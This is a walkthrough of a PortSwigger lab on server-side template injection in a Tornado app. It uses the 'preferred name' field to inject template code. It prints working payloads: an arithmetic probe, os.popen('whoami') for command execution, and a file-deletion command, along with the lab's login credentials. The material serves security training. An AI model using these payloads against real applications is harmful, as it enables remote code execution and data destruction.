# Basic Server-Side Template Injection (Code Context)

This lab is exploitable through server-side template injection because of how a Tornado template is used unsafely. The goal is to consult the Tornado documentation, figure out how to execute arbitrary code, and then delete `morale.txt` from Carlos's home directory.

Login credentials for your own account: wiener:peter

Hint: Pay close attention to the "preferred name" feature.

---

**Reference:**
- https://portswigger.net/web-security/server-side-template-injection/exploiting

pic 1

---

It's possible to update your email and set a preferred display name:

pic 2
pic 3

Setting it to the nickname causes "H0td0g" to appear in the comments:

pic 4

```
POST /my-account/change-blog-post-author-display HTTP/2
...

blog-post-author-display=user.nickname}}{{2*2}}&csrf=PdLe58H5wvdQEv1PtPmQOJMvRz3krZgs
```

pic 5
pic 6

```
POST /my-account/change-blog-post-author-display HTTP/2
...

blog-post-author-display=user.nickname}}{%+import+os+%}{{os.popen("whoami").read()}}&csrf=PdLe58H5wvdQEv1PtPmQOJMvRz3krZgs
```

pic 7
pic 8

``` 
POST /my-account/change-blog-post-author-display HTTP/2
...

blog-post-author-display=user.nickname}}{%+import+os+%}{{os.popen("rm+/home/carlos/morale.txt").read()}}&csrf=PdLe58H5wvdQEv1PtPmQOJMvRz3krZgs
```

pic 9
